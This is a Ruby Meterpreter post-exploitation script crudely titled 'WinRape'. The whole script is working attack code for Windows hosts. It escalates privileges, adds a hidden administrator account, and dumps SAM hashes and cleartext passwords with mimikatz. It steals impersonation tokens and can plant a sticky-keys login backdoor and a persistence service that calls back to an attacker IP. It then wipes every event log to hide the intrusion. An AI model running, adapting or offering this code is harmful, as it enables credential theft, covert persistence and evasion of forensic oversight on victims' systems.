# $Id:$ 
# $Revision: 2b$
# Meterpreter WinRape - Windows AutoRape - Auotmated Post Exploitation Script
# Authors: Hood3dRob1n
# http://i.imgur.com/Dlup3uX.png
# http://i.imgur.com/mTKeAhO.png
# http://i.imgur.com/tbL3SRQ.png

################## Variable Declarations ##################
session = client

#Basic Arguments user can provide when running meterpreter script
@@exec_opts = Rex::Parser::Arguments.new(
	"-h" => [ false,"Help menu." ],
	"-U" => [ true,"Username to use on new account creation (default user: ows)" ],
	"-P" => [ true,"Password to use on new account creation (default pass: Ows!rox123)" ],
	"-L" => [ false,"Enable Login Backdoor using Swaparoo Sethc.exe Sicky Keys Method (Disabled by default)" ],
	"-s" => [ false,"Enable Backdoor Meterpreter Service Install (Disabled by default & requires -i & -p options)" ],
	"-i" => [ true,"IP to use for Persistence Service Install" ],
	"-p" => [ true,"PORT to use for Persistence Service Install" ],
	"-n" => [ true,"Name of Process to Auto-Migrate into (default: winlogon.exe)" ]
)

################## Function Declarations ##################

#Usage
def usage
	print_line("Windows AutoRape - Auotmated Post Exploitation Script")
	print_line(@@exec_opts.usage)
	raise Rex::Script::Completed
end

#check for proper Meterpreter Platform
def unsupported
	print_error("This version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end

#check for proper privileges are in place to run the tasks (i.e. are we admin?)
def notadmin
	#Initiate getsystem command to try and escalate privileges if not already admin/system
	print_error("Running as: #{session.sys.config.getuid}")
	print_error("You need admin privs to run this!")
	print_status("Trying to escalate privileges to resolve the issue.......")
	session.priv.getsystem(0)

	#Check to see if our escalation attempts worked, if not bail out in flames of glory :p
	if session.railgun.shell32.IsUserAnAdmin()['return']
		print_good("Escalation attempt was a success!")
		print_good("Now Running as: #{session.sys.config.getuid}")
		print_status("Continuing post exploit meterpreter script now.....")
	else
		print_error("Escalation attempt seems to have been a failure!")
		print_status("Try to escalate on your own and then re-run this script.....")
		print_status("Shutting things down for now.....")
		raise Rex::Script::Completed
	end
end

#Execute our list of command needed to achieve the desired goal (borrowed from dark operator & unleashed intro)
def list_exec(session, cmdlst) #session is our meter sessions, cmdlst is our array of commands to run on target
	r=''
	session.response_timeout=120
	cmdlst.each do |cmd|
		begin
			print_status("Executing: #{cmd}")
			r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
			while(d = r.channel.read)
				break if d == ""
			end
			r.channel.close
			r.close
		rescue ::Exception => e
			print_error("Error Running Command #{cmd}: #{e.class} #{e}")
		end
	end
end


#Auto migrate from current process ID to targeted process ID (winlogon.exe by default)
def auto_migrate(pid_name)
	original_pid = session.sys.process.getpid
	target_pid = session.sys.process[pid_name]
	if not target_pid
		print_error("Could not identify the target process ID for #{pid_name}!")
		print_error("Can't migrate automatically without it, sorry....")
		raise Rex::Script::Completed
	else
		begin
			print_status("Migrating from #{original_pid} to #{target_pid}....")
			session.core.migrate(target_pid)
			print_good("Successfully migrated to process #{target_pid}!")
		rescue ::Exception => e
			print_error("Could not migrate in to process!")
			print_error(e)
		end
	end
end

#clear out any event logs on the target box before we leave (you could run)single command to leverage existing scripts but I wanted to make my own hybrid version for an all in one :p
def clear_event_logs
	print_status("Clearing Event Logs, this will leave an event 517 in all logs after....")
	begin
		#eventlog_list is a builtin to return array of event logs found querying registry
		eventlog_list.each do |log_name|
			print_status("Wiping #{log_name} Event Log....")
			log = session.sys.eventlog.open(log_name)
			log.clear
		end
		print_good("All Finished - The Coast is Clear!")
	rescue ::Exception => e
		print_status("Error clearing Event Log: #{e.class} #{e}")
	end
end

#Get basic system information so we know what we are working with....
def getinfo
	begin
		print_status("Enumerating System info....")
		print_good("Computer Name: #{session.sys.config.sysinfo['Computer']}")
		print_good("OS: #{session.sys.config.sysinfo['OS']}")
		print_good("Running as: #{session.sys.config.getuid}")
		print_good("Current PID: #{session.sys.process.getpid}")

		#Clients interfaces in array we will enumerate in a minute to display
		interfaces = session.net.config.interfaces
		print_status("Interfaces: ")
		print_line("")
		interfaces.each do |i|
			print_line("#{i.pretty}")
		end

	rescue ::Exception => e
		print_error("The following error was encountered #{e}")
	end
end

# Backdoor the Sethc.exe Sticky Keys Tool accessible via Login Screen on any Windows box (local or via RDP). Has no auth!
def sethc_login_backdoor(session)
	sethc = [ "takeown /f #{path}sethc.exe", 
		  "icacls #{path}sethc.exe /grant administrators:f", 
		  "rename #{path}sethc.exe  sethc.exe.bak", 
		  "copy #{path}cmd.exe #{path}cmd3.exe", 
		  "rename #{path}cmd3.exe sethc.exe" ]

	sethc_cleanup = [ "takeown /f #{path}sethc.exe", 
			  "icacls #{path}sethc.exe /grant administrators:f",
			  "takeown /f #{path}sethc.exe.bak", 
			  "icacls #{path}sethc.exe.bak /grant Administrators:f",
			  "del #{path}sethc.exe", 
			  "rename #{path}sethc.exe.bak sethc.exe" ]

	cleanup_file = ::File.join(Msf::Config.log_directory,"scripts", "#{session.sock.peerhost}_sethc_cleanup.rc")
	f=File.open(cleanup_file, 'w+')
	sethc_cleanup.each do |cmd|
		f.puts "execute -H -f cmd.exe -a '/c #{cmd}'"
	end
	f.close

	print_status("Starting the Swaparoo Sethc.exe backdooring process.....")
	if session.fs.file.exists?("#{path}sethc.exe.bak")
		print_error("Target appears to have already been backdoored with this method!")
		print_error("Delete or rename the backup file (sethc.exe.bak) manually or try 'run swaparoo -r' for running cleanup tasks.....")
	else
		list_exec(session, sethc)
		# All done, peace out!
		print_status("")
		print_good("Finished Swaparoo!")
		print_good("Press Shift key 5 times at Login Screen and you should be greeted by a shell!")
		print_good("Run #{cleanup_file} to swap things back..."
		print_status("")
	end
end

# check if UAC is enabled (the builtin for privs isn't workign for me for somereason so I made a new version), idk.....
def uac_enabled
	#Confirm target could have UAC, then find out level its running at if possible
	if session.sys.config.sysinfo['OS'] !~ /Windows Vista|Windows 2008|Windows [78]/
			uac = false
	else
		begin
			key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System',KEY_READ)
			if key.query_value('EnableLUA').data == 1
				uac = true
				print_status("UAC is Enabled, checking level...")
				uac_level = key.query_value('ConsentPromptBehaviorAdmin').data 
				if uac_level.to_i == 2
					print_error("UAC is set to 'Always Notify'")
					print_error("Things won't work under these conditions.....")
					raise Rex::Script::Completed
				elsif uac_level.to_i == 5
					print_error("UAC is set to Default")
					print_error("Run 'exploit/windows/local/bypassuac' to bypass this UAC setting, if you haven't already...")
				elsif uac_level.to_i == 0
					print_good("UAC Settings Don't appear to be an issue, try ''exploit/windows/local/ask' if it is...")
				else
					print_status("Unknown UAC Setting, if it doesn't work try things manually to see if UAC is blocking......")
				end
			end
			key.close
		rescue::Exception => e
			print_error("Error Checking UAC: #{e.class} #{e}")
		end
	end

	return uac
end

##################### MAIN ######################
# Parse our user provided options and run post script accordingly....
sysroot = session.fs.file.expand_path("%SYSTEMROOT%") #now we can get base path for different versions of Windows
path = "#{sysroot}\\\\system32\\\\" #twice is nice (must escape properly for dir dividers
helpcall = 0
syspersist = 0
sethc=0
new_user = 'ows'
new_pass = 'Ows!Rox123'
pid_name = 'winlogon.exe'
master_ip = (session.exploit_datastore['LHOST']) || '127.0.0.1' #Defaults to the LHOST value which was used to exploit the sessions in use
master_port = 6969
@@exec_opts.parse(args) do |opt, idx, val|
	case opt
		when "-h"
			helpcall = 1	#Help Menu
		when "-U"
			new_user = val	#override default user
		when "-P"
			new_pass = val	#override default pass
		when "-L"
			sethc=1
		when "-S"
			syspersist = 1  #0 => Disabled, 1 => Enabled
		when "-i"
			master_ip = val
		when "-p"
			master_port = val.to_i
		when "-n"
			pid_name = val
	end
end

#Make sure we were passed proper arguments to run
if helpcall == 1
	usage
end

#we only can do this on windows :p
unsupported if not session.platform =~ /win/i

# Need DB Access to store loot findings!
if session.framework.db.active
	zdb = true
else
	print_error("MSF Database NOT Connected - Can't store the loot!")
	zdb = false
end

#Check if UAC is enabled and potentially going to cause us problems on newer systems
if uac_enabled
	print_error("Can't run this on target system without bypassing UAC first!")
	print_status("Please make sure you have already done this or script will not work......")
	print_status("")
else
	print_good("Confirmed, UAC is not an issue!")
end

#Make sure we are admin
if session.railgun.shell32.IsUserAnAdmin()['return']
	print_good("Confirmed, currently running as admin.....")
else
	notadmin
end

#migrate over to a safe process...
auto_migrate(pid_name)

#Get some bsaic info
getinfo

#add a new account to the local box
newaccount=[]
newaccount << "net user #{new_user} #{new_pass} /add"
newaccount << "net localgroup administrators /add #{new_user}"
print_status("Adding New Account #{new_user}:#{new_pass} to machine......")
list_exec(session, newaccount)
print_line("")

#Dump Passwords from SAM File
# I can't find documentation on storing loot from scripts and results havent been good
# SO we write the results to file then add file as loot instead, idk...
#hash_file = "#{ENV['PWD']}/#{session.sock.peerhost}_hashes.txt"
hash_file = ::File.join(Msf::Config.log_directory,"scripts", "#{session.sock.peerhost}_hashes.txt")
print_status("Hashes will be saved in JtR format to:")
print_status(hash_file)
if File.exists?(hash_file)
	known_hashes = File.open(hash_file).readlines
else
	known_hashes = []
end
f = File.open(hash_file, 'a+')
session.priv.sam_hashes.each do |user|
	print_good("#{user}")
	# Write the credentials to file 
	# Only save new ones not in file to reduce duplicates
	if not known_hashes.include?("#{user}\n") #have to account for new line when comparing
		f.puts user
	end
end
f.close
print_line("")

#load & run mimikatz to try and dump passwords
print_status("Loading & Running Mimikatz for Clear-Text Password Dumping......")
#mimikatz_file = "#{ENV['PWD']}/#{session.sock.peerhost}_mimikatz.txt"
mimikatz_file = ::File.join(Msf::Config.log_directory,"scripts", "#{session.sock.peerhost}_mimikatz.txt")
print_status("Dumping results to: #{mimikatz_file}")
f = File.open(mimikatz_file, 'a+')
session.console.run_single("load mimikatz")
tbl = Rex::Ui::Text::Table.new(
	'Header'  => "WDIGEST DUMP",
	'Indent'  => 1,
	'Columns' => [
		"AuthID",
		"Domain",
		"User",
		"Pass",
		"Type"
	])

wd = session.mimikatz.wdigest
wd.each do |entry|
	tbl << [ entry[:authid], entry[:domain], entry[:user], entry[:password], entry[:package] ]
end
print_line("\n" + tbl.to_s)
# Write the credentials to file 
f.puts(tbl.to_s)
f.puts ""

tbl = Rex::Ui::Text::Table.new(
	'Header'  => "KERBEROS DUMP",
	'Indent'  => 1,
	'Columns' => [
		"AuthID",
		"Domain",
		"User",
		"Pass",
		"Type"
	])

kerb = session.mimikatz.kerberos
kerb.each do |entry|
	tbl << [ entry[:authid], entry[:domain], entry[:user], entry[:password], entry[:package] ]
end
print_line(tbl.to_s)
f.puts(tbl.to_s)
f.puts ""
f.close
if zdb
	#Register our hash file & mimikatz cleartext dump as loot in the database
	data = File.open(hash_file).read
	framework.db.find_or_create_loot( :host => session.sock.peerhost, :service => "smb", :type => "smb_hash", :info => "Windows Hashes", :data => data, :path => hash_file, :name => "windows.hashes" )
	data = File.open(mimikatz_file).read
	framework.db.find_or_create_loot( :host => session.sock.peerhost, :service => "logon", :type => "password", :info => "Mimikatz Dump", :data => data, :path => mimikatz_file, :name => "windows.cleartext" )
end


# Enumerate Domains and any Domain Controllers the Victim may know about (we use Mubix script cause no need to re-write :))
print_status("Enumerating Domains......")
session.console.run_single("run post/windows/gather/enum_domains")
if client.railgun.netapi32.NetGetJoinInformation(nil,4,4)["BufferType"] != 3
	print_error("System is not actually joined to domain, skipping cachedump attempts....")
else
	session.console.run_single("run post/windows/gather/cachedump")
end

#load & run incognito to see if any non-standard local account tokens available or Domain accounts :)
print_status("Loading Incognito & Listing Impersonation Tokens......")
#incognito_file = "#{ENV['PWD']}/#{session.sock.peerhost}_incognito-tokens.txt"
incognito_file = ::File.join(Msf::Config.log_directory,"scripts", "#{session.sock.peerhost}_incognito-tokens.txt")
print_status("Saving any tokens we find to: #{incognito_file}")
session.console.run_single("load incognito")
loot=0
#0=> List User Tokens, 1=> List Group Tokens
print_status("Checking User Tokens......")
session.incognito.incognito_list_tokens(0)['impersonation'].split("\n").each do |stealme|
	if stealme =~ /No tokens available/
		print_error("#{stealme}")
	else
		print_good("#{stealme}")
		f = File.open(incognito_file, 'a+')
		f.puts stealme
		f.close
		loot=1
	end
end
print_status("Checking Group Tokens......")
session.incognito.incognito_list_tokens(1)['impersonation'].split("\n").each do |stealme|
	if stealme =~ /No tokens available/
		print_error("#{stealme}")
	else
		print_good("#{stealme}")
		f = File.open(incognito_file, 'a+')
		f.puts stealme
		f.close
		loot=1
	end
end
print_line("")
if loot == 1
	if zdb
		#Register our Toekns file as loot in the database
		data = File.open(incognito_file).read
		framework.db.find_or_create_loot( :host => session.sock.peerhost, :service => "login", :type => "token", :info => "Incognito Token Dump", :data => data, :path => incognito_file, :name => "incognito.tokens" )
	end
end

# Take a quick screenshot of the victim for proof of life talks
print_status("Taking snapshot for proof of life......")
session.console.run_single("screenshot")

# Enumerate any Database details we can, usually packed full of good creds and other interesting data :)
print_status("Checking for any Database instances......")
session.console.run_single("run post/windows/gather/enum_db")

#Run Sethc.exe Sticky Keys Backddor?
if sethc.to_i == 1
	sethc_login_backdoor(session)
else
	print_status("Swaparoo option disabled....")
	print_status("Skipping Swaparoo Backdoor Installer....")
end

#Run Persistence Install?
if syspersist.to_i == 1  #0 => Disabled, 1 => Enabled
	#Persistence via Service install & send shells to our user provided target C&C.....
	print_status("Running Meterpreter Persistence Service Installer....")
	print_status("Make sure you have listener setup on #{master_port} on port #{master_ip}....")
	select(nil, nil, nil, 4) #Dramatic pause....
	session.console.run_single("run persistence -S -i 30 -p #{master_port} -r #{master_ip}")
else
	print_status("Persistence option disabled....")
	print_status("Skipping Meterpreter Service Installer....")
end

#cleanup before exiting
clear_event_logs

#All done now :)
print_good("WinRape Complete!")
print_good("")
#EOF
